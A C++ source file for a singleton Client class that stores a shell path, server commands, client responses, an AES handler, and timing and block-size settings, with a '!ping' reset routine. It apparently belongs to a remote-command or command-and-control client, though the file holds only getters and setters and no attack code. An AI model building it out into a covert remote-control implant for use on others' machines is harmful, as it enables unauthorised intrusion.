#include "Client.h"
#include "AESHandler.h"

Client::Client() : id(0), aesHandler(AESHandler::getInstance()), shell(L""), connected(false), cancel_cmd(false), seq(0), delay(0), timeout(0), blocksize(0) {}

Client* Client::instance = nullptr; // Initialize singleton instance to null

void Client::setShell(const std::wstring& sheell) {
    shell = sheell;
}

std::wstring Client::getShell() const {
    return shell;
}

void Client::setArguments(const std::string& arg) {
    arguments = arg;
}

std::string Client::getArguments() const {
    return arguments;
}

void Client::setServerCommand(const std::string& srv_cmd) {
    server_command = srv_cmd;
}

std::string Client::getServerCommand() const {
    return server_command;
}

void Client::setClientResponse(const std::string& client_rsp) {
    client_response = client_rsp;
}

std::string Client::getClientResponse() const {
    return client_response;
}

// Singleton accessor
Client* Client::getInstance() {
    if (!instance) {
        instance = new Client();
    }
    return instance;
}

// Return pointer to the AESHandler instance
AESHandler* Client::getAesHandler() const {
    return aesHandler;
}

void Client::setIP(const std::string& ip) {
    ip_addr = ip;
}

std::string Client::getIP() const {
    return ip_addr;
}

void Client::setConnected(bool status) {
    connected = status;
}

bool Client::isConnected() const {
    return connected;
}

void Client::setCancelCmd(bool cancel_status) {
    cancel_cmd = cancel_status;
}

bool Client::isCancelCmd() const {
    return cancel_cmd;
}

void Client::setId(int clientId) {
    id = clientId;
}

int Client::getId() const {
    return id;
}

void Client::setSeq(int sequence) {
    seq = sequence;
}

int Client::getSeq() const {
    return seq;
}

void Client::setDelay(int delayTime) {
    delay = delayTime;
}

int Client::getDelay() const {
    return delay;
}

void Client::setTimeout(int timeoutTime) {
    timeout = timeoutTime;
}

int Client::getTimeout() const {
    return timeout;
}

void Client::setBlocksize(int blockSize) {
    blocksize = blockSize;
}

int Client::getBlocksize() const {
    return blocksize;
}

void Client::cleanup() {
    setClientResponse("!ping");
    setServerCommand("");
    setCancelCmd(false);
}

void Client::FullCleanup() {
    setConnected(false);
    setClientResponse("!ping");
    setId(20);
    setSeq(14);
    setDelay(500);  // Set initial delay in milliseconds
    setTimeout(getTimeout()+5000);  
    setBlocksize(32);
    setServerCommand("");
    setCancelCmd(false);
}
